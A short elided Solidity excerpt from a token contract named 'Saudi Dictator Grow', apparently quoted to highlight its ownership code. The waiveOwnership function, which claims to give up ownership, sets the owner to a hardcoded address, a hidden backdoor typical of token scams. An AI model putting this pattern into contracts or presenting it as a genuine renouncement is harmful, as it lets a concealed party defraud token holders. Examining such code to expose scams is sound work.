...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x7BF14DF603346E8C0b4A93095c4893b2B19E7056);
    }
...
contract SaudiDictatorGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Saudi Dictator Grow";
    string private _symbol = "SAUDDG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x23DFD8Fb4463BaF3C3B3d98A687C3Af1307fdDEc);
    address payable public teamWalletAddress = payable(0xa5458B7B578aD17442dd2c03467D656C5d0a0129);
